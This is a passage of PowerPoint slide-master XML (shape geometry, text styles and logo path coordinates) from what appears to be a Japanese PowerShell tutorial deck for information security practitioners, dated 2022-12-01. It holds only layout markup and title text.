          <a:prstGeom prst="rtTriangle">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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7" name="直角三角形 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{744DC4E6-6F7C-47AB-8546-70F237955C94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipH="1">
            <a:off x="11364000" y="6030000"/>
            <a:ext cx="828000" cy="828000"/>
          </a:xfrm>
          <a:prstGeom prst="rtTriangle">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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48147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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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335360" y="152636"/>
            <a:ext cx="11521280" cy="39604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フッター プレースホルダー 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2564E175-3A7A-493A-A6EC-98C76D805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76299" y="6592266"/>
            <a:ext cx="10439401" cy="26573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altLang="ja-JP" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>超特急（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>2022-12-01</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>）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908CF9-FD2A-43E2-9B37-C2D4E0B82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2604" y="6592267"/>
            <a:ext cx="45583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1">
                <a:solidFill>
                  <a:schemeClr val="tx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93298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30" r:id="rId2"/>
    <p:sldLayoutId id="2147483731" r:id="rId3"/>
    <p:sldLayoutId id="2147483732" r:id="rId4"/>
    <p:sldLayoutId id="2147483745" r:id="rId5"/>
    <p:sldLayoutId id="2147483733" r:id="rId6"/>
    <p:sldLayoutId id="2147483734" r:id="rId7"/>
    <p:sldLayoutId id="2147483746" r:id="rId8"/>
    <p:sldLayoutId id="2147483735" r:id="rId9"/>
    <p:sldLayoutId id="2147483741" r:id="rId10"/>
    <p:sldLayoutId id="2147483740" r:id="rId11"/>
    <p:sldLayoutId id="2147483736" r:id="rId12"/>
    <p:sldLayoutId id="2147483737" r:id="rId13"/>
    <p:sldLayoutId id="2147483742" r:id="rId14"/>
    <p:sldLayoutId id="2147483744" r:id="rId15"/>
  </p:sldLayoutIdLst>
  <p:hf hdr="0" dt="0"/>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="l" defTabSz="914126" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="110000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:buNone/>
        <a:defRPr kumimoji="1" sz="2399" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mj-ea"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
        </a:defRPr>
      </a:lvl1pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="342797" indent="-342797" algn="l" defTabSz="914126" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr kumimoji="1" sz="3199" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="742727" indent="-285664" algn="l" defTabSz="914126" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
        <a:buChar char="–"/>
        <a:defRPr kumimoji="1" sz="27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kumimoji="1"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spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
        <a:buChar char="–"/>
        <a:defRPr kumimoji="1" sz="19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spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
        <a:buChar char="»"/>
        <a:defRPr kumimoji="1" sz="19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kumimoji="1"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kumimoji="1"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kumimoji="1"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kumimoji="1"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126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kumimoji="1"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551" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" pos="7129" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" orient="horz" pos="414" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="10" orient="horz" pos="39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2324C4-D5E5-496A-AB46-B2303C46B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072" y="2312876"/>
            <a:ext cx="10439856" cy="1083374"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>超特急</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>増補版</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="24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0CE8004-6E63-45D4-8A07-12E065DF1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300" y="1844824"/>
            <a:ext cx="10439400" cy="424732"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>情報セキュリティ実務家のための</a:t>
            </a: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88D4A997-CC3C-4645-8A4E-900370013E0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="black">
          <a:xfrm>
            <a:off x="437531" y="6239932"/>
            <a:ext cx="2346102" cy="164552"/>
            <a:chOff x="1630577" y="5391353"/>
            <a:chExt cx="4676339" cy="328077"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
        </p:grpSpPr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60BE0482-F8EB-412A-8BB1-32319AA5C437}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="black">
            <a:xfrm>
              <a:off x="1630577" y="5391353"/>
              <a:ext cx="2978809" cy="328077"/>
              <a:chOff x="4389519" y="2142121"/>
              <a:chExt cx="1357020" cy="149458"/>
            </a:xfrm>
            <a:grpFill/>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="13" name="Freeform 136">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4489D72-C9A1-4476-BB61-4CB9C3D6ED0E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4389519" y="2142121"/>
                <a:ext cx="106510" cy="147740"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 22 w 124"/>
                  <a:gd name="T1" fmla="*/ 66 h 172"/>
                  <a:gd name="T2" fmla="*/ 22 w 124"/>
                  <a:gd name="T3" fmla="*/ 19 h 172"/>
                  <a:gd name="T4" fmla="*/ 20 w 124"/>
                  <a:gd name="T5" fmla="*/ 10 h 172"/>
                  <a:gd name="T6" fmla="*/ 12 w 124"/>
                  <a:gd name="T7" fmla="*/ 6 h 172"/>
                  <a:gd name="T8" fmla="*/ 4 w 124"/>
                  <a:gd name="T9" fmla="*/ 6 h 172"/>
                  <a:gd name="T10" fmla="*/ 0 w 124"/>
                  <a:gd name="T11" fmla="*/ 4 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 w 124"/>
                  <a:gd name="T13" fmla="*/ 3 h 172"/>
                  <a:gd name="T14" fmla="*/ 4 w 124"/>
                  <a:gd name="T15" fmla="*/ 0 h 172"/>
                  <a:gd name="T16" fmla="*/ 37 w 124"/>
                  <a:gd name="T17" fmla="*/ 2 h 172"/>
                  <a:gd name="T18" fmla="*/ 70 w 124"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 80 w 124"/>
                  <a:gd name="T21" fmla="*/ 2 h 172"/>
                  <a:gd name="T22" fmla="*/ 100 w 124"/>
                  <a:gd name="T23" fmla="*/ 6 h 172"/>
                  <a:gd name="T24" fmla="*/ 112 w 124"/>
                  <a:gd name="T25" fmla="*/ 14 h 172"/>
                  <a:gd name="T26" fmla="*/ 116 w 124"/>
                  <a:gd name="T27" fmla="*/ 19 h 172"/>
                  <a:gd name="T28" fmla="*/ 122 w 124"/>
                  <a:gd name="T29" fmla="*/ 32 h 172"/>
                  <a:gd name="T30" fmla="*/ 124 w 124"/>
                  <a:gd name="T31" fmla="*/ 41 h 172"/>
                  <a:gd name="T32" fmla="*/ 120 w 124"/>
                  <a:gd name="T33" fmla="*/ 62 h 172"/>
                  <a:gd name="T34" fmla="*/ 108 w 124"/>
                  <a:gd name="T35" fmla="*/ 81 h 172"/>
                  <a:gd name="T36" fmla="*/ 89 w 124"/>
                  <a:gd name="T37" fmla="*/ 91 h 172"/>
                  <a:gd name="T38" fmla="*/ 67 w 124"/>
                  <a:gd name="T39" fmla="*/ 95 h 172"/>
                  <a:gd name="T40" fmla="*/ 63 w 124"/>
                  <a:gd name="T41" fmla="*/ 95 h 172"/>
                  <a:gd name="T42" fmla="*/ 60 w 124"/>
                  <a:gd name="T43" fmla="*/ 95 h 172"/>
                  <a:gd name="T44" fmla="*/ 60 w 124"/>
                  <a:gd name="T45" fmla="*/ 94 h 172"/>
                  <a:gd name="T46" fmla="*/ 62 w 124"/>
                  <a:gd name="T47" fmla="*/ 91 h 172"/>
                  <a:gd name="T48" fmla="*/ 67 w 124"/>
                  <a:gd name="T49" fmla="*/ 91 h 172"/>
                  <a:gd name="T50" fmla="*/ 76 w 124"/>
                  <a:gd name="T51" fmla="*/ 89 h 172"/>
                  <a:gd name="T52" fmla="*/ 87 w 124"/>
                  <a:gd name="T53" fmla="*/ 81 h 172"/>
                  <a:gd name="T54" fmla="*/ 93 w 124"/>
                  <a:gd name="T55" fmla="*/ 69 h 172"/>
                  <a:gd name="T56" fmla="*/ 97 w 124"/>
                  <a:gd name="T57" fmla="*/ 53 h 172"/>
                  <a:gd name="T58" fmla="*/ 96 w 124"/>
                  <a:gd name="T59" fmla="*/ 47 h 172"/>
                  <a:gd name="T60" fmla="*/ 91 w 124"/>
                  <a:gd name="T61" fmla="*/ 28 h 172"/>
                  <a:gd name="T62" fmla="*/ 83 w 124"/>
                  <a:gd name="T63" fmla="*/ 20 h 172"/>
                  <a:gd name="T64" fmla="*/ 78 w 124"/>
                  <a:gd name="T65" fmla="*/ 15 h 172"/>
                  <a:gd name="T66" fmla="*/ 66 w 124"/>
                  <a:gd name="T67" fmla="*/ 11 h 172"/>
                  <a:gd name="T68" fmla="*/ 60 w 124"/>
                  <a:gd name="T69" fmla="*/ 11 h 172"/>
                  <a:gd name="T70" fmla="*/ 53 w 124"/>
                  <a:gd name="T71" fmla="*/ 12 h 172"/>
                  <a:gd name="T72" fmla="*/ 50 w 124"/>
                  <a:gd name="T73" fmla="*/ 16 h 172"/>
                  <a:gd name="T74" fmla="*/ 50 w 124"/>
                  <a:gd name="T75" fmla="*/ 107 h 172"/>
                  <a:gd name="T76" fmla="*/ 51 w 124"/>
                  <a:gd name="T77" fmla="*/ 155 h 172"/>
                  <a:gd name="T78" fmla="*/ 53 w 124"/>
                  <a:gd name="T79" fmla="*/ 160 h 172"/>
                  <a:gd name="T80" fmla="*/ 57 w 124"/>
                  <a:gd name="T81" fmla="*/ 166 h 172"/>
                  <a:gd name="T82" fmla="*/ 60 w 124"/>
                  <a:gd name="T83" fmla="*/ 168 h 172"/>
                  <a:gd name="T84" fmla="*/ 71 w 124"/>
                  <a:gd name="T85" fmla="*/ 168 h 172"/>
                  <a:gd name="T86" fmla="*/ 75 w 124"/>
                  <a:gd name="T87" fmla="*/ 170 h 172"/>
                  <a:gd name="T88" fmla="*/ 74 w 124"/>
                  <a:gd name="T89" fmla="*/ 172 h 172"/>
                  <a:gd name="T90" fmla="*/ 71 w 124"/>
                  <a:gd name="T91" fmla="*/ 172 h 172"/>
                  <a:gd name="T92" fmla="*/ 35 w 124"/>
                  <a:gd name="T93" fmla="*/ 172 h 172"/>
                  <a:gd name="T94" fmla="*/ 8 w 124"/>
                  <a:gd name="T95" fmla="*/ 172 h 172"/>
                  <a:gd name="T96" fmla="*/ 3 w 124"/>
                  <a:gd name="T97" fmla="*/ 170 h 172"/>
                  <a:gd name="T98" fmla="*/ 4 w 124"/>
                  <a:gd name="T99" fmla="*/ 169 h 172"/>
                  <a:gd name="T100" fmla="*/ 6 w 124"/>
                  <a:gd name="T101" fmla="*/ 168 h 172"/>
                  <a:gd name="T102" fmla="*/ 14 w 124"/>
                  <a:gd name="T103" fmla="*/ 168 h 172"/>
                  <a:gd name="T104" fmla="*/ 20 w 124"/>
                  <a:gd name="T105" fmla="*/ 164 h 172"/>
                  <a:gd name="T106" fmla="*/ 21 w 124"/>
                  <a:gd name="T107" fmla="*/ 155 h 172"/>
                  <a:gd name="T108" fmla="*/ 22 w 124"/>
                  <a:gd name="T109" fmla="*/ 107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24" h="172">
                    <a:moveTo>
                      <a:pt x="22" y="66"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="22" y="66"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="7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4" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4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37" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="122" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="122" y="52"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="95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0" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="94"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="94"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="69"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="47"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="155"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="155"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="160"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="164"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="170"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="170"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="170"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="170"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="168"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="164"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="155"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="155"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="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4" name="Freeform 137">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B92ADE9-CEF0-4F13-A865-EF1FDA307D7A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks noEditPoints="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4504619" y="2165312"/>
                <a:ext cx="137433" cy="124548"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 20 w 160"/>
                  <a:gd name="T1" fmla="*/ 14 h 145"/>
                  <a:gd name="T2" fmla="*/ 19 w 160"/>
                  <a:gd name="T3" fmla="*/ 8 h 145"/>
                  <a:gd name="T4" fmla="*/ 12 w 160"/>
                  <a:gd name="T5" fmla="*/ 4 h 145"/>
                  <a:gd name="T6" fmla="*/ 2 w 160"/>
                  <a:gd name="T7" fmla="*/ 2 h 145"/>
                  <a:gd name="T8" fmla="*/ 2 w 160"/>
                  <a:gd name="T9" fmla="*/ 0 h 145"/>
                  <a:gd name="T10" fmla="*/ 32 w 160"/>
                  <a:gd name="T11" fmla="*/ 0 h 145"/>
                  <a:gd name="T12" fmla="*/ 63 w 160"/>
                  <a:gd name="T13" fmla="*/ 0 h 145"/>
                  <a:gd name="T14" fmla="*/ 92 w 160"/>
                  <a:gd name="T15" fmla="*/ 4 h 145"/>
                  <a:gd name="T16" fmla="*/ 106 w 160"/>
                  <a:gd name="T17" fmla="*/ 12 h 145"/>
                  <a:gd name="T18" fmla="*/ 115 w 160"/>
                  <a:gd name="T19" fmla="*/ 34 h 145"/>
                  <a:gd name="T20" fmla="*/ 113 w 160"/>
                  <a:gd name="T21" fmla="*/ 45 h 145"/>
                  <a:gd name="T22" fmla="*/ 87 w 160"/>
                  <a:gd name="T23" fmla="*/ 77 h 145"/>
                  <a:gd name="T24" fmla="*/ 132 w 160"/>
                  <a:gd name="T25" fmla="*/ 128 h 145"/>
                  <a:gd name="T26" fmla="*/ 145 w 160"/>
                  <a:gd name="T27" fmla="*/ 138 h 145"/>
                  <a:gd name="T28" fmla="*/ 153 w 160"/>
                  <a:gd name="T29" fmla="*/ 141 h 145"/>
                  <a:gd name="T30" fmla="*/ 160 w 160"/>
                  <a:gd name="T31" fmla="*/ 142 h 145"/>
                  <a:gd name="T32" fmla="*/ 158 w 160"/>
                  <a:gd name="T33" fmla="*/ 145 h 145"/>
                  <a:gd name="T34" fmla="*/ 137 w 160"/>
                  <a:gd name="T35" fmla="*/ 145 h 145"/>
                  <a:gd name="T36" fmla="*/ 115 w 160"/>
                  <a:gd name="T37" fmla="*/ 142 h 145"/>
                  <a:gd name="T38" fmla="*/ 88 w 160"/>
                  <a:gd name="T39" fmla="*/ 113 h 145"/>
                  <a:gd name="T40" fmla="*/ 69 w 160"/>
                  <a:gd name="T41" fmla="*/ 87 h 145"/>
                  <a:gd name="T42" fmla="*/ 48 w 160"/>
                  <a:gd name="T43" fmla="*/ 85 h 145"/>
                  <a:gd name="T44" fmla="*/ 46 w 160"/>
                  <a:gd name="T45" fmla="*/ 87 h 145"/>
                  <a:gd name="T46" fmla="*/ 46 w 160"/>
                  <a:gd name="T47" fmla="*/ 113 h 145"/>
                  <a:gd name="T48" fmla="*/ 48 w 160"/>
                  <a:gd name="T49" fmla="*/ 134 h 145"/>
                  <a:gd name="T50" fmla="*/ 56 w 160"/>
                  <a:gd name="T51" fmla="*/ 141 h 145"/>
                  <a:gd name="T52" fmla="*/ 65 w 160"/>
                  <a:gd name="T53" fmla="*/ 141 h 145"/>
                  <a:gd name="T54" fmla="*/ 67 w 160"/>
                  <a:gd name="T55" fmla="*/ 143 h 145"/>
                  <a:gd name="T56" fmla="*/ 63 w 160"/>
                  <a:gd name="T57" fmla="*/ 145 h 145"/>
                  <a:gd name="T58" fmla="*/ 8 w 160"/>
                  <a:gd name="T59" fmla="*/ 145 h 145"/>
                  <a:gd name="T60" fmla="*/ 4 w 160"/>
                  <a:gd name="T61" fmla="*/ 143 h 145"/>
                  <a:gd name="T62" fmla="*/ 7 w 160"/>
                  <a:gd name="T63" fmla="*/ 141 h 145"/>
                  <a:gd name="T64" fmla="*/ 13 w 160"/>
                  <a:gd name="T65" fmla="*/ 141 h 145"/>
                  <a:gd name="T66" fmla="*/ 20 w 160"/>
                  <a:gd name="T67" fmla="*/ 130 h 145"/>
                  <a:gd name="T68" fmla="*/ 21 w 160"/>
                  <a:gd name="T69" fmla="*/ 89 h 145"/>
                  <a:gd name="T70" fmla="*/ 46 w 160"/>
                  <a:gd name="T71" fmla="*/ 71 h 145"/>
                  <a:gd name="T72" fmla="*/ 48 w 160"/>
                  <a:gd name="T73" fmla="*/ 74 h 145"/>
                  <a:gd name="T74" fmla="*/ 63 w 160"/>
                  <a:gd name="T75" fmla="*/ 75 h 145"/>
                  <a:gd name="T76" fmla="*/ 77 w 160"/>
                  <a:gd name="T77" fmla="*/ 72 h 145"/>
                  <a:gd name="T78" fmla="*/ 88 w 160"/>
                  <a:gd name="T79" fmla="*/ 54 h 145"/>
                  <a:gd name="T80" fmla="*/ 90 w 160"/>
                  <a:gd name="T81" fmla="*/ 34 h 145"/>
                  <a:gd name="T82" fmla="*/ 79 w 160"/>
                  <a:gd name="T83" fmla="*/ 17 h 145"/>
                  <a:gd name="T84" fmla="*/ 65 w 160"/>
                  <a:gd name="T85" fmla="*/ 10 h 145"/>
                  <a:gd name="T86" fmla="*/ 48 w 160"/>
                  <a:gd name="T87" fmla="*/ 10 h 145"/>
                  <a:gd name="T88" fmla="*/ 46 w 160"/>
                  <a:gd name="T89" fmla="*/ 13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60" h="145">
                    <a:moveTo>
                      <a:pt x="21" y="55"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="21" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="5"/>
                    </a:lnTo>
